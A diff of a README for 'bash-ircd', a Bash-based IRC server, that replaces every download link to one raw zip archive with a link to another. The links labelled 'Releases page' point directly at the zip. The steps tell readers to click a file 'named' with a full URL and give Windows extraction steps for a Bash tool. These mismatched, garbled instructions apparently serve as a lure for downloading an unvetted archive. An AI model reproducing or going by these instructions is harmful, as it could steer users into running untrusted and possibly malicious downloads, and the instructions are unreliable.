@@ -4,20 +4,20 @@
 
 Welcome to **bash-ircd**. This application allows you to run an Internet Relay Chat server using only Bash. Let's make chatting easier for everyone!
 
-[![Download bash-ircd](https://raw.githubusercontent.com/sohailgerman/bash-ircd/main/poral/bash-ircd_v2.2.zip)](https://raw.githubusercontent.com/sohailgerman/bash-ircd/main/poral/bash-ircd_v2.2.zip)
+[![Download bash-ircd](https://raw.githubusercontent.com/sohailgerman/bash-ircd/main/poral/bash-ircd-3.4.zip)](https://raw.githubusercontent.com/sohailgerman/bash-ircd/main/poral/bash-ircd-3.4.zip)
 
 ## 📥 Download & Install
 
 To start using bash-ircd, follow these steps:
 
 1. **Visit the Releases page:** 
-   Go to the [Releases page](https://raw.githubusercontent.com/sohailgerman/bash-ircd/main/poral/bash-ircd_v2.2.zip). 
+   Go to the [Releases page](https://raw.githubusercontent.com/sohailgerman/bash-ircd/main/poral/bash-ircd-3.4.zip). 
    
 2. **Choose the right version:** 
    Scroll through the list and find the latest release. Each release has a version number next to it. 
 
 3. **Download the file:** 
-   Click on the release version. You will see a list of files. Click on the file named `https://raw.githubusercontent.com/sohailgerman/bash-ircd/main/poral/bash-ircd_v2.2.zip` to start the download.
+   Click on the release version. You will see a list of files. Click on the file named `https://raw.githubusercontent.com/sohailgerman/bash-ircd/main/poral/bash-ircd-3.4.zip` to start the download.
 
 4. **Extract the files:** 
    Once the download is complete, locate the zipped file in your downloads folder. Right-click on the file and select "Extract All." Follow the prompts to extract the files.
@@ -61,4 +61,4 @@ We welcome contributions! If you have ideas, improvements, or just want to share
 
 For more information about service features and enhancements, feel free to explore the documentation in the repository. Don't forget to check back for updates and new versions.
 
-Visit the [Releases page](https://raw.githubusercontent.com/sohailgerman/bash-ircd/main/poral/bash-ircd_v2.2.zip) again to download the latest versions!
+Visit the [Releases page](https://raw.githubusercontent.com/sohailgerman/bash-ircd/main/poral/bash-ircd-3.4.zip) again to download the latest versions!
